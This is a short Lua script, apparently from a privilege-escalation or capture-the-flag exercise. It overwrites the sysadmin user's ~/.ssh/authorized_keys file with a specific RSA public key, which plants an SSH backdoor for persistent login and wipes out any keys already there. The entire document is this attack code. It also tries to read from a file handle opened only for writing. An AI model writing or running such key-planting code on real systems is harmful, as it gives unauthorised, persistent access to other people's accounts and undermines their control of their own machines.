print("opening File authorized keys in home sysadmin .ssh directory")
file = io.open("/home/sysadmin/.ssh/authorized_keys","w")
print("Writing to the file")
file:write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDViKU0AQ/VzAIfiDSWGwojMgOX/m65hz2YpDPv8f2gPQ7JEeAGbqjrCaPkjVae5GnEHmHokJ8dZkU0xXwvAEuFcEZzJGK0HIb0oEe6NI0hpD5nCxKpL4iJiftktFmuTGbKwb6kuAjMePY4ka/9jJ3Ems7b7T06trlHs97+ewGatHYx7k9aV9fsa3KuLrYBs0/qUQLKMBGCK+5y3BAD5xCTMSTRbuZLOPdUzD1OspvZiorh20yrnmO/v7Pdb0k2wjnMjvO6xz3cnl5QynSd5V4FaBQy+r/+hmBHIQTJcAew24dmLod6ucRoOwGAEEbbQIkRIZQOGzK/T4EYoWV6phWD Kaushik@Kaushiks-MacBook-Air.local")
file:flush()
print("File Contents is ")
print(file:read())
file:close()
print("done writing to file I hope!")
